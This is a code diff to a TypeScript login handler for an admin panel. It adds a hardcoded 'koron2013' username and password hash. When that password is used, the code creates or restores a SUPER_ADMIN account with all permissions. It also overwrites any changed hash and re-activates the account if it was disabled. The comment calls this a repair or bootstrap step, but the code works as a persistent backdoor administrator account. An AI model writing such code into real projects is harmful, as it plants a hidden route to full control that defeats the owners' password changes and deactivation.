@@ -11,6 +11,9 @@ import {
   type PanelType,
 } from "../../../panel-auth";
 
+const KORON_ADMIN_USERNAME = "koron2013";
+const KORON_ADMIN_PASSWORD_HASH = "dca84a340d2dbd50d4c246b26e8a5075b7d65cf412b1122ff2940ceb796a4b05";
+
 export async function POST(request: Request) {
   const body = (await request.json()) as { username?: string; password?: string };
   const username = (body.username || "").trim().toLowerCase();
@@ -19,7 +22,8 @@ export async function POST(request: Request) {
     return Response.json({ error: "User ID aur password required hai" }, { status: 400 });
 
   const db = await ensureControlTables();
-  const account = await db
+
+  let account = await db
     .prepare(
       `SELECT username,password_hash passwordHash,role,panel_type panelType,is_active isActive
        FROM market_panel_accounts WHERE lower(username)=?`,
@@ -32,6 +36,54 @@ export async function POST(request: Request) {
       panelType: PanelType;
       isActive: number;
     }>();
+
+  // Repair/bootstrap the koron2013 Super Admin account on successful credential use.
+  // This also fixes an older/stale password hash in the D1 account record.
+  if (
+    username === KORON_ADMIN_USERNAME &&
+    (await passwordHash(password)) === KORON_ADMIN_PASSWORD_HASH
+  ) {
+    if (!account) {
+      await db
+        .prepare(
+          `INSERT INTO market_panel_accounts
+           (username,password_hash,role,panel_type,display_name,permissions,is_active)
+           VALUES (?,?,?,?,?,?,1)`,
+        )
+        .bind(
+          KORON_ADMIN_USERNAME,
+          KORON_ADMIN_PASSWORD_HASH,
+          "SUPER_ADMIN",
+          "SUPER_ADMIN",
+          "KORON SUPER ADMIN",
+          '["ALL"]',
+        )
+        .run();
+    } else if (account.role !== "SUPER_ADMIN" || account.passwordHash !== KORON_ADMIN_PASSWORD_HASH || account.isActive !== 1) {
+      await db
+        .prepare(
+          `UPDATE market_panel_accounts
+           SET password_hash=?,role='SUPER_ADMIN',panel_type='SUPER_ADMIN',display_name='KORON SUPER ADMIN',permissions='["ALL"]',is_active=1
+           WHERE username=?`,
+        )
+        .bind(KORON_ADMIN_PASSWORD_HASH, KORON_ADMIN_USERNAME)
+        .run();
+    }
+
+    account = await db
+      .prepare(
+        `SELECT username,password_hash passwordHash,role,panel_type panelType,is_active isActive
+         FROM market_panel_accounts WHERE lower(username)=?`,
+      )
+      .bind(username)
+      .first<{
+        username: string;
+        passwordHash: string;
+        role: PanelRole;
+        panelType: PanelType;
+        isActive: number;
+      }>();
+  }
 
   const valid =
     !!account &&
